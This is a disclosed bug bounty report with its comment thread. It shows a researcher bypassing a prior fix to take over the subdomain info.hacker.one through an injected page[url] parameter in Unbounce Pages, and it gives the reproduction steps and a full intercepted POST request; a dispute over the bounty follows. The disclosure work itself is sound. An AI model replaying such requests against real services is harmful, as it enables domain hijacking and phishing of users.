title: Subdomain takeover #4 at info.hacker.one

profile.name: HackerOne
profile.about: Vulnerability disclosure should be safe, transparent, and rewarding.

vulnerability_information:
**Summary:**

Hi team, looking the last fix released from unbounce team at https://hackerone.com/reports/217358 i've been able to bypass it and takeover the subdomain info.hacker.one with a new vulnerable **ENDPOINT + PARAM COMBINATION** at UnbouncePages App

**Actual Dns Entry:**
{F174718}


### Reproduction Steps for HackerOne

1) I have claimed the domain and placed a new-page for PoC validation located under: 
Go to -> http://info.hacker.one/testing-new-takeover-04-10-17/
2) You see the alert box and the New Subdomain Takeover
{F174729}


**[ Unbounce Pages Team Section ]**

### Reproduction Steps PoC at new PARAM-ENPOINT COMBINATION

1) Login to account
2) Create a New Page under any domain or default domain (unbouncepages.com)
3) Go to "Change URL"
4) Fill with any input 
5) Intercept Request with burp or another proxy
6) Change Enpoint to ->  ```/[account-id]/pages/[page-id]/url ```
7) Add this param at the end of body ->  ``` &page%5Burl%5D=info.hacker.one/testing-new-takeover-04-10-17 ```

POST REQUEST

``` 
POST /2235922/pages/4d2a5d74-2119-4c68-8d93-f456566f2fe8/url/   HTTP/1.1
Host: app.unbounce.com
Connection: close
Content-Length: 186
X-NewRelic-ID: XQQAUl9ADAQFV1hW
Origin: https://app.unbounce.com
X-CSRF-Token: 7fHXoRIVY2kDTQxt+k6jjNgJagryJHBfu7MuZLtB7V4=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript
X-Requested-With: XMLHttpRequest
Referer: https://app.unbounce.com/2235922/pages/4d2a5d74-2119-4c68-8d93-f456566f2fe8
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.8,fi;q=0.6,en;q=0.4
Cookie: ...

utf8=%E2%9C%93&_method=put&authenticity_token=7fHXoRIVY2kDTQxt%2Bk6jjNgJagryJHBfu7MuZLtB7V4%3D&page%5Bdomain%5D=unbouncepages.com&page%5Bpath%5D=testing-new-takeover-bypass-akita&button=&page%5Burl%5D=info.hacker.one/testing-new-takeover-04-10-17

``` 

**Vulnerable Endpoint: /[account-id]/pages/[page-id]/url**
**Vulnerable Injected PARAM: page%5Burl%5D=anydomain.com**

**This Request update the page with the New Domain (any domain could be used and creating content into it)**

I create a New Private Video PoC here for the above explained -> https://youtu.be/HKYMYkDDYW8

**(All branded domains under unbounce app are vulnerable)**

### Security Impact at H1:

*An attacker can utilize this domain info.hacker.one for targeting the organization by fake login hackerOne forms, or steal sensitive information of teams (credentials, credit card information, etc)

### Security impact at Unbounce Pages:

*An attacker can utilize this bug affecting all branded domains and customers at unbouncepages.com
and use all domains with evil purposes as stealing of sensitive information, credentials, credit card info, etc

Please let me know if more info needed or any help,

Best Regards,
@ak1t4
vulnerability_information_html:
Summary:

Hi team, looking the last fix released from unbounce team at https://hackerone.com/reports/217358 i've been able to bypass it and takeover the subdomain info.hacker.one with a new vulnerable ENDPOINT + PARAM COMBINATION at UnbouncePages App

Actual Dns Entry:

Reproduction Steps for HackerOne

1) I have claimed the domain and placed a new-page for PoC validation located under:
Go to -> http://info.hacker.one/testing-new-takeover-04-10-17/
2) You see the alert box and the New Subdomain Takeover

[ Unbounce Pages Team Section ]

Reproduction Steps PoC at new PARAM-ENPOINT COMBINATION

1) Login to account
2) Create a New Page under any domain or default domain (unbouncepages.com)
3) Go to "Change URL"
4) Fill with any input
5) Intercept Request with burp or another proxy
6) Change Enpoint to -> /[account-id]/pages/[page-id]/url
7) Add this param at the end of body -> &page%5Burl%5D=info.hacker.one/testing-new-takeover-04-10-17

POST REQUEST

POST /2235922/pages/4d2a5d74-2119-4c68-8d93-f456566f2fe8/url/   HTTP/1.1
Host: app.unbounce.com
Connection: close
Content-Length: 186
X-NewRelic-ID: XQQAUl9ADAQFV1hW
Origin: https://app.unbounce.com
X-CSRF-Token: 7fHXoRIVY2kDTQxt+k6jjNgJagryJHBfu7MuZLtB7V4=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript
X-Requested-With: XMLHttpRequest
Referer: https://app.unbounce.com/2235922/pages/4d2a5d74-2119-4c68-8d93-f456566f2fe8
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.8,fi;q=0.6,en;q=0.4
Cookie: ...

utf8=%E2%9C%93&_method=put&authenticity_token=7fHXoRIVY2kDTQxt%2Bk6jjNgJagryJHBfu7MuZLtB7V4%3D&page%5Bdomain%5D=unbouncepages.com&page%5Bpath%5D=testing-new-takeover-bypass-akita&button=&page%5Burl%5D=info.hacker.one/testing-new-takeover-04-10-17

Vulnerable Endpoint: /[account-id]/pages/[page-id]/url
Vulnerable Injected PARAM: page%5Burl%5D=anydomain.com

This Request update the page with the New Domain (any domain could be used and creating content into it)

I create a New Private Video PoC here for the above explained -> https://youtu.be/HKYMYkDDYW8

(All branded domains under unbounce app are vulnerable)

Security Impact at H1:

*An attacker can utilize this domain info.hacker.one for targeting the organization by fake login hackerOne forms, or steal sensitive information of teams (credentials, credit card information, etc)

Security impact at Unbounce Pages:

*An attacker can utilize this bug affecting all branded domains and customers at unbouncepages.com
and use all domains with evil purposes as stealing of sensitive information, credentials, credit card info, etc

Please let me know if more info needed or any help,

Best Regards,
@ak1t4

activities.message: Thank you @ak1t4 .  I am moving this to our internal system for triage and resolution.

activities.markdown_message: Hi @ubscott, any update about a fix for this? thanks

activities.message:
Hi @ak1t4,

The fix is progressing. The tech team is auditing the entire app for vulnerable endpoints.  That way new subdomain takeover tickets won't keep being opened.  As I mentioned, we are tracking this internally, so there won't be much information or updates shared here.
activities.markdown_message:
Hi @ak1t4,

The fix is progressing. The tech team is auditing the entire app for vulnerable endpoints. That way new subdomain takeover tickets won't keep being opened. As I mentioned, we are tracking this internally, so there won't be much information or updates shared here.

activities.message:
Thanks for the update, that's awesome. I'm glad that the team try to cover all potential vulnerabilities.
From my Pentesting work view, i don't test anything else during an open report, that's why i don't have any other bypass for this issue right now. Otherwise you would have known.

Let me know if you need anything else. Regards,
@ak1t4

activities.message: I appreciate that very much, @ak1t4.
activities.markdown_message: I appreciate that very much, @ak1t4.

activities.message:
Hi @ak1t4,

Thanks again for the report.

Based on our conversation in #217358, we're lowering our bounty amount for this issue as compared to previous reports. $500 is our minimum bounty, though we reserve the right to award lower (or none) in the future for Unbounce-specific issues.

Appreciate the assistance in helping keep us and our third-parties secure.
activities.markdown_message:
Hi @ak1t4,

Thanks again for the report.

Based on our conversation in #217358, we're lowering our bounty amount for this issue as compared to previous reports. $500 is our minimum bounty, though we reserve the right to award lower (or none) in the future for Unbounce-specific issues.

Appreciate the assistance in helping keep us and our third-parties secure.

activities.message:
Hi team, im a little disappointed  about this bounty decision, this issue has the same severity level of  the others submitted before. 
As good example, hackerOne needs to encourage the researcher to improve their skills and hacks, and not to  limit it, with this kind of actions, reducing the bounty amount. 
You can't blame the researcher for find several errors in certain Applications that hackerOne uses and do it vulnerable.
I hope that can reconsider this situation and thus contemplate future cases similar  to resolve in the best possible way for the researcher and for the HackerOne platform And above all to improve our awesome community.

regards,
@ak1t4
activities.markdown_message:
Hi team, im a little disappointed about this bounty decision, this issue has the same severity level of the others submitted before.
As good example, hackerOne needs to encourage the researcher to improve their skills and hacks, and not to limit it, with this kind of actions, reducing the bounty amount.
You can't blame the researcher for find several errors in certain Applications that hackerOne uses and do it vulnerable.
I hope that can reconsider this situation and thus contemplate future cases similar to resolve in the best possible way for the researcher and for the HackerOne platform And above all to improve our awesome community.

regards,
@ak1t4

@ak1t4, we were very clear in #217358 about our stance on future Unbounce security issues. I'm sorry you don't agree with our change, but we did provide guidance at that time, so it should not have been a surprise. In fact, we may stop paying for Unbounce issues entirely in the near future except for extremely critical issues that affect our specific Unbounce instance.

As we have said in the previous reports as well, Unbounce is not a critical component to our platform, so it doesn't make sense for us to pay bounties for their issues, unless they specific affect us in some critical way. There are plenty of other programs running on HackerOne that offer bounties. Just take a look at our Directory for some programs that might be of better interest to you.

We're all about enabling and helping our hackers, but it also doesn't make sense for HackerOne to pay out for issues in third-party services it uses that don't have direct impact on our platform security.

activities.message:
Hi @reed, thanks your reply:

I totally understand what you are saying,  in that case, HackerOne needs to reconsidere his policy, like example to change it, and deleting ```info.hacker.one``` domain from his scope. If something does not go as one wish, you can not speculate on it, at most you can learn from that situation and continue.. I think this situation is the prime example of it. Particularly I am not asking for anything that is not fair, I consider that if hackerone decides to change its policy must do it after resolving correctly all the open reports. 

As for report # 217358 at no time says that hackerone will reduce payments for a particular report, it only says that they will consider payments only for critical issues affecting info.hacker.one, this report is an excellent example of them, affects directly to `` Info.hacker.one`` in critical way. At no time it is explicitly stated that h1 will reduce the amount in future similar reports.

I think I am not asking for anything that is not logical and correct. Anyway HackerOne has the last word, and I am more than grateful to the whole H1 team and this awesome platform, Whatever will decided, sure to be fine.

Kind Regards,
@ak1t4

As for report # 217358 at no time says that hackerone will reduce payments for a particular report, it only says that they will consider payments only for critical issues affecting info.hacker.one, this report is an excellent example of them, affects directly to Info.hacker.one in critical way. At no time it is explicitly stated that h1 will reduce the amount in future similar reports.

I think I am not asking for anything that is not logical and correct. Anyway HackerOne has the last word, and I am more than grateful to the whole H1 team and this awesome platform, Whatever will decided, sure to be fine.

@ak1t4

activities.message:
In general, if the vulnerability is in a third-party, not much we can directly do about it. We're always happy to relay the report or at least connect a researcher with the company, but we recommend familiarizing yourself with the EFF's [Vulnerability Reporting FAQ](https://www.eff.org/issues/coders/vulnerability-reporting-faq) and encourage you to perform other contact attempts in parallel to our effort.

As for Unbounce, their [security page](https://unbounce.com/security/) asks that people submit issues directly to them at support@unbounce.com, not by finding one of their customers who has a bug bounty program and submitting through it. It just so happens that for some period of time, we were willing to pay out bounties for this particular service, and we still may pay for critical issues affecting our specific Unbounce instance.

Also, again, we warned you before this report was filed that the policy would be changing as to how we handled these reports.
activities.markdown_message:
In general, if the vulnerability is in a third-party, not much we can directly do about it. We're always happy to relay the report or at least connect a researcher with the company, but we recommend familiarizing yourself with the EFF's Vulnerability Reporting FAQ and encourage you to perform other contact attempts in parallel to our effort.

As for Unbounce, their security page asks that people submit issues directly to them at support@unbounce.com, not by finding one of their customers who has a bug bounty program and submitting through it. It just so happens that for some period of time, we were willing to pay out bounties for this particular service, and we still may pay for critical issues affecting our specific Unbounce instance.

Also, again, we warned you before this report was filed that the policy would be changing as to how we handled these reports.

@reed Thanks for the explanation and for the clarification about this, I agree with most of all that.

I have a question, To which situation referred when you say that HackerOne are willing to pay out bounties for the particular service (unbounce) and still may pay for critical issues affecting to your "specific" Unbounce instance.?

Do you refer That H1 will pay bounties only when the issue directly affects the unbounce h1 account? Or affect directly the domain info.hacker.one as we can see in this report?

activities.message: Update: The fix is live.  Thank you for your patience.  The engineering team wanted to do a more thorough audit of the controller endpoints so they didn't miss one.
activities.markdown_message: Update: The fix is live. Thank you for your patience. The engineering team wanted to do a more thorough audit of the controller endpoints so they didn't miss one.

activities.message: @ak1t4 As for your earlier question, I refer to things that impact HackerOne directly in some critical way, whether it be via our Unbounce account or via `info.hacker.one` (which is Unbounce).

summaries.content:
i've been able to bypass the fix of old takeovers on the subdomain info.hacker.one,
The bounty resolution was +lowered from H1, they explain this saying:

```
Based on our conversation in #217358, we're lowering our bounty amount for this issue as compared to previous reports. $500 is our minimum bounty, though we reserve the right to award lower (or none) in the future for Unbounce-specific issues.
```
***After quietly and thoroughly revealing the whole thing I could observe and realize this situation. When it comes to 3rd party issues, there is no obligation on the team (H1 or any team) to pay bounties.***

Thanks you H1 team for resolved this issue and pay a bounty for this issue.

I hope you enjoy this report as i enjoyed doing it.

happy hacking
@ak1t4

After quietly and thoroughly revealing the whole thing I could observe and realize this situation. When it comes to 3rd party issues, there is no obligation on the team (H1 or any team) to pay bounties.
